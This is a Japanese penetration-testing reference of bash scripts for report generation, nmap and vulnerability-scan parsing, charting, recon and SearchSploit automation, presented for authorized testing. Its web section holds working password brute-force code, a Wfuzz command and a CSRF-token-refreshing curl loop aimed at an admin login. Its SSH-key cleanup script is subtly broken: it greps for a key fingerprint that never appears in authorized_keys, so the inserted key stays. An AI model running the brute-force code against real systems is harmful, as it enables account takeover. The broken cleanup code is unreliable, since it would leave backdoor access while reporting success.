# ペネトレーションテスト レポート自動化・E2Eテスト リファレンス

> **⚠️ 倫理的使用の原則**: 本リファレンスは、明示的な許可（Written Authorization）を得た対象システムへのセキュリティテスト・教育目的のみを対象とする。認可のないシステムへの適用は違法であり、一切禁止する。

---

## 1. レポート自動化

### 1.1 テンプレート設計

```bash
#!/usr/bin/env bash
set -euo pipefail
IFS=$'\n\t'

# テンプレートファイルを生成
create_report_template() {
    local template_file="${1:-report_template.txt}"
    cat > "${template_file}" << 'EOF'
# Security Assessment Report
## Title: [REPORT_TITLE]

## 1. Executive Summary
[EXECUTIVE_SUMMARY]

## 2. Methodology
[METHODOLOGY]

## 3. Findings
[FINDINGS]

## 4. Risk Summary
[RISK_SUMMARY]

## 5. Recommendations
[RECOMMENDATIONS]

## 6. Conclusion
[CONCLUSION]
EOF
    echo "テンプレート作成完了: ${template_file}"
}
```

テンプレートセクションの設計指針:
- **Executive Summary**: 非技術者向け概要（リスクレベル・主要所見・推奨事項）
- **Methodology**: 使用ツール・テスト手法・スコープ
- **Findings**: 脆弱性詳細（CVSS・証拠・再現手順）
- **Risk Summary**: 重大度別集計
- **Recommendations**: 優先度付き修正提案

### 1.2 テンプレートへのデータ注入

```bash
#!/usr/bin/env bash
set -euo pipefail
IFS=$'\n\t'

generate_report() {
    local template="${1:?テンプレートファイルが必要}"
    local output="report_$(date +%Y%m%d_%H%M%S).md"
    local title="${2:-Security Assessment Report}"
    local findings="${3:-findings.txt}"

    # プレースホルダーを実データで置換
    sed \
        -e "s/\[REPORT_TITLE\]/${title}/" \
        -e "s/\[METHODOLOGY\]/自動スキャン・手動検証・エクスプロイト検証の組み合わせ/" \
        -e "s/\[CONCLUSION\]/詳細は本文参照/" \
        "${template}" > "${output}"

    echo "レポート生成完了: ${output}"
}
```

---

## 2. データ抽出スクリプティング

### 2.1 nmap 出力の解析

```bash
#!/usr/bin/env bash
set -euo pipefail

# nmapスキャン結果からオープンポートを抽出
extract_open_ports() {
    local nmap_output="${1:?nmap出力ファイルが必要}"
    local result_file="open_ports.txt"

    # Grepable形式（-oG）からオープンポートを抽出
    grep "/open/" "${nmap_output}" | awk '{print $2, $3}' > "${result_file}"
    echo "オープンポート抽出完了: ${result_file}"
    wc -l < "${result_file}" | xargs -I{} echo "検出ポート数: {}"
}

# サービスバージョン情報の抽出
extract_service_versions() {
    local nmap_output="${1:?nmap出力ファイルが必要}"
    grep -Eo '[0-9]+/tcp +open +[a-zA-Z0-9]+ +[a-zA-Z0-9./ -]+' "${nmap_output}"
}
```

### 2.2 脆弱性スキャン結果の解析（JSON形式）

```bash
#!/usr/bin/env bash
set -euo pipefail

# CVSS 7.0以上の高・重大脆弱性を抽出
extract_high_critical_vulns() {
    local scan_results="${1:?スキャン結果JSONが必要}"
    local output="high_critical_vulns.json"

    jq '.vulnerabilities[] | select(.cvss >= 7.0) | {
        id: .id,
        description: .description,
        cvss: .cvss,
        severity: (if .cvss >= 9.0 then "Critical" elif .cvss >= 7.0 then "High" else "Medium" end)
    }' "${scan_results}" > "${output}"

    echo "高・重大脆弱性抽出完了: ${output}"
}

# 重大度別サマリー生成
generate_vuln_summary() {
    local scan_results="${1:?スキャン結果JSONが必要}"

    local critical medium low
    critical=$(jq '[.vulnerabilities[] | select(.cvss >= 9.0)] | length' "${scan_results}")
    high=$(jq '[.vulnerabilities[] | select(.cvss >= 7.0 and .cvss < 9.0)] | length' "${scan_results}")
    medium=$(jq '[.vulnerabilities[] | select(.cvss >= 4.0 and .cvss < 7.0)] | length' "${scan_results}")
    low=$(jq '[.vulnerabilities[] | select(.cvss < 4.0)] | length' "${scan_results}")

    cat << EOF
=== 脆弱性サマリー ===
Critical (CVSS 9.0+): ${critical}
High     (CVSS 7.0-8.9): ${high}
Medium   (CVSS 4.0-6.9): ${medium}
Low      (CVSS < 4.0):   ${low}
EOF
}
```

---

## 3. データ可視化

### 3.1 gnuplot によるグラフ生成

**折れ線グラフ（脆弱性トレンド）:**

```bash
#!/usr/bin/env bash
set -euo pipefail

generate_trend_graph() {
    local data_file="${1:?データファイルが必要}"
    local output_png="vulnerabilities_trend.png"

    cat > /tmp/plot_trend.gnuplot << EOF
set terminal png size 800,600
set output '${output_png}'
set title "脆弱性トレンド (ネットワークセグメント別)"
set xlabel "スキャン期間"
set ylabel "脆弱性数"
set grid
set key top left
plot "${data_file}" using 1:2 with linespoints title "セグメントA", \
     "${data_file}" using 1:3 with linespoints title "セグメントB", \
     "${data_file}" using 1:4 with linespoints title "セグメントC"
EOF
    gnuplot /tmp/plot_trend.gnuplot
    echo "グラフ生成完了: ${output_png}"
}
```

**棒グラフ（部門別重大脆弱性）:**

```bash
generate_dept_chart() {
    local data_file="${1:?データファイルが必要}"
    local output_png="dept_vulnerabilities.png"

    cat > /tmp/plot_dept.gnuplot << EOF
set terminal png size 800,600
set output '${output_png}'
set title "部門別 重大脆弱性数"
set boxwidth 0.5
set style fill solid
set xlabel "部門"
set ylabel "重大脆弱性数"
set grid ytics
set yrange [0:*]
plot "${data_file}" using 2:xtic(1) with boxes lc rgb "red" title "重大脆弱性", \
     '' using 0:2:2 with labels offset 0,1 notitle
EOF
    gnuplot /tmp/plot_dept.gnuplot
    echo "棒グラフ生成完了: ${output_png}"
}
```

### 3.2 ASCII バーチャート（ターミナル表示）

```bash
#!/usr/bin/env bash
set -euo pipefail

# ASCII棒グラフ表示
print_ascii_bar() {
    local label="${1:?ラベルが必要}"
    local count="${2:?カウントが必要}"
    local max_width=50

    printf "%-10s: " "${label}"
    local bar_width=$(( count > max_width ? max_width : count ))
    printf '%0.s#' $(seq 1 "${bar_width}")
    printf " (%d)\n" "${count}"
}

display_vuln_chart() {
    local critical="${1:-0}"
    local high="${2:-0}"
    local medium="${3:-0}"
    local low="${4:-0}"

    echo "=== 脆弱性重大度チャート ==="
    print_ascii_bar "Critical" "${critical}"
    print_ascii_bar "High" "${high}"
    print_ascii_bar "Medium" "${medium}"
    print_ascii_bar "Low" "${low}"
}
```

### 3.3 CSV エクスポート

```bash
export_to_csv() {
    local output_csv="${1:-vulnerability_summary.csv}"
    {
        echo "Severity,Count,CVSS_Range"
        echo "Critical,${critical},9.0-10.0"
        echo "High,${high},7.0-8.9"
        echo "Medium,${medium},4.0-6.9"
        echo "Low,${low},0.1-3.9"
    } > "${output_csv}"
    echo "CSV出力完了: ${output_csv}"
}
```

---

## 4. E2Eペネトレーションテスト方法論

### 4.1 ペンテストライフサイクル

```
認可取得（Written Authorization）
    ↓
1. 偵察（Reconnaissance）
   - パッシブ: OSINT・WHOIS・DNS列挙
   - アクティブ: ポートスキャン・サービス検出
    ↓
2. スキャン・列挙（Scanning & Enumeration）
   - 脆弱性スキャン・バナーグラビング
    ↓
3. エクスプロイト（Exploitation）
   - 公開エクスプロイトの適用・認証攻撃
    ↓
4. ポストエクスプロイト（Post-Exploitation）
   - 権限昇格・ピボット・証拠収集
    ↓
5. クリーンアップ（Cleanup）
   - テストアーティファクトの完全削除
    ↓
6. レポート作成（Reporting）
   - 所見文書化・推奨事項提示
```

### 4.2 内部ネットワーク侵害シナリオ

#### フェーズ1: 偵察の自動化

```bash
#!/usr/bin/env bash
set -euo pipefail
IFS=$'\n\t'

# 認可されたターゲットへの自動偵察スクリプト
pentest_recon() {
    local target_ip="${1:?対象IPアドレスが必要}"
    local output_dir="pentest_$(date +%Y%m%d)"
    mkdir -p "${output_dir}"

    echo "[*] 偵察フェーズ開始: ${target_ip}"
    echo "[*] スキャン対象: ${target_ip}" > "${output_dir}/scope.txt"
    echo "[*] 開始時刻: $(date)" >> "${output_dir}/scope.txt"

    # 全ポートスキャン + サービスバージョン検出
    echo "[*] nmapスキャン実行中..."
    nmap -p- -sV "${target_ip}" -oN "${output_dir}/nmap_scan.txt" \
         -oG "${output_dir}/nmap_grepable.txt"

    echo "[*] 偵察完了。結果: ${output_dir}/"
}
```

#### フェーズ2: 既知エクスプロイト調査の自動化

```bash
# nmapスキャン結果からSearchSploitで自動検索
auto_searchsploit() {
    local nmap_output="${1:?nmap出力ファイルが必要}"
    local results_dir="${2:-exploit_search}"
    mkdir -p "${results_dir}"

    echo "[*] SearchSploit自動検索開始..."
    grep -Eo '[0-9]+/tcp +open +[a-zA-Z0-9]+ +[a-zA-Z0-9./ -]+' "${nmap_output}" \
    | while IFS= read -r line; do
        local service version
        service=$(echo "${line}" | awk '{print $3}')
        version=$(echo "${line}" | awk '{print $4, $5}')
        echo "  [*] 検索中: ${service} ${version}"
        searchsploit "${service} ${version}" 2>/dev/null \
            >> "${results_dir}/searchsploit_results.txt" || true
    done

    echo "[*] 検索完了: ${results_dir}/searchsploit_results.txt"
}
```

#### フェーズ3: 権限昇格 - NFS不正設定の悪用（教育目的）

NFS（Network File System）がルートディレクトリを全クライアントに公開している場合の検証手順:

```bash
# NFS設定確認（読み取り専用操作）
check_nfs_exports() {
    local target_ip="${1:?対象IPが必要}"
    echo "[*] NFS設定確認（認可された環境のみ）"
    showmount -e "${target_ip}" 2>/dev/null || echo "NFS未稼働またはアクセス不可"
}
```

**重要**: NFS経由の権限昇格検証は、認可されたペンテスト環境でのみ実施。テスト後は必ず挿入したSSHキー等のアーティファクトを完全削除すること。

---

## 5. Webアプリケーション評価シナリオ

### 5.1 ブルートフォース攻撃の段階的評価

**低セキュリティ環境（GETベース認証）:**

```bash
#!/usr/bin/env bash
set -euo pipefail

# Wfuzzを使用したGETベースブルートフォース（認可環境のみ）
wfuzz_bruteforce_low() {
    local target_url="${1:?対象URLが必要}"
    local session_cookie="${2:?セッションクッキーが必要}"
    local wordlist="${3:-/usr/share/wordlists/rockyou.txt}"

    echo "[*] Wfuzzブルートフォース開始（低セキュリティ環境）"
    wfuzz --hw 210 -c \
        -w "${wordlist}" \
        -b "${session_cookie}" \
        "${target_url}?username=admin&password=FUZZ&Login=Login"
}
```

### 5.2 高セキュリティ環境対応 - CSRFトークン動的抽出

静的ツール（Wfuzzなど）が失敗するCSRF保護付き環境への対応:

```bash
#!/usr/bin/env bash
set -euo pipefail
IFS=$'\n\t'

# CSRF対応ブルートフォーススクリプト（認可されたWebアプリテスト専用）
csrf_aware_bruteforce() {
    local target_url="${1:?対象URLが必要}"
    local session_cookie="${2:?セッションクッキーが必要}"
    local wordlist="${3:?ワードリストパスが必要}"

    # 初回CSRFトークン取得
    local user_token
    user_token=$(curl -s -H "Cookie: ${session_cookie}" "${target_url}" \
        | grep -oP '(?<=name="user_token" value=").+?(?=")')

    echo "[*] CSRFトークン取得完了"

    # 各パスワードで認証試行
    while IFS= read -r password || [[ -n "${password}" ]]; do
        password=$(echo "${password}" | tr -d '\r')

        # ログイン試行
        local response
        response=$(curl -s -G \
            -H "Cookie: ${session_cookie}" \
            --data-urlencode "username=admin" \
            --data-urlencode "password=${password}" \
            --data-urlencode "Login=Login" \
            --data-urlencode "user_token=${user_token}" \
            "${target_url}")

        # 成功判定
        if echo "${response}" | grep -q "Welcome"; then
            echo "[+] 認証成功 - ユーザー: admin, パスワード: ${password}"
            return 0
        fi

        # 次回用CSRFトークン更新
        user_token=$(echo "${response}" \
            | grep -oP '(?<=name="user_token" value=").+?(?=")')

    done < "${wordlist}"

    echo "[-] パスワードが見つかりませんでした"
    return 1
}
```

**CSRFトークン対応の要点:**
- 毎リクエスト前にトークンを動的取得
- セッションクッキーを全リクエストで維持
- レスポンスから次回トークンを即時更新

---

## 6. クリーンアップ・後処理の自動化

```bash
#!/usr/bin/env bash
set -euo pipefail

# テスト完了後のクリーンアップ（必須）
pentest_cleanup() {
    local mount_point="${1:-/tmp/nfs_mount}"
    local target_authorized_keys="${2:-}"

    echo "[*] クリーンアップ開始..."

    # NFSマウントの解除
    if mountpoint -q "${mount_point}" 2>/dev/null; then
        umount "${mount_point}"
        echo "[*] NFSマウント解除完了"
    fi
    rmdir "${mount_point}" 2>/dev/null || true

    # 挿入したSSHキーの削除（テスト完了後必須）
    if [[ -n "${target_authorized_keys}" && -f "${target_authorized_keys}" ]]; then
        echo "[!] SSHキー削除: ${target_authorized_keys}"
        # 自身の公開鍵行を削除
        local pub_key_fingerprint
        pub_key_fingerprint=$(ssh-keygen -l -f ~/.ssh/id_rsa.pub | awk '{print $2}')
        grep -v "${pub_key_fingerprint}" "${target_authorized_keys}" \
            > /tmp/ak_clean && mv /tmp/ak_clean "${target_authorized_keys}"
    fi

    echo "[*] クリーンアップ完了"
}
```

---

## 7. ペンテストチェックリスト

### 実施前（必須確認）
- [ ] 書面による認可（Written Authorization）取得済み
- [ ] テストスコープ（対象IPレンジ・システム）明確化
- [ ] テスト期間・時間帯の合意
- [ ] 緊急連絡先の確保

### 実施中
- [ ] 全コマンド・ツール実行のログ保存
- [ ] タイムスタンプ付き所見記録
- [ ] エクスプロイト成功時はスクリーンショット取得
- [ ] 破壊的操作の回避

### 実施後（必須）
- [ ] 挿入したSSHキー等のアーティファクト完全削除
- [ ] NFSマウント等のテスト用接続の解除
- [ ] 一時ファイル・スクリプトの削除
- [ ] 所見レポートの作成・提出
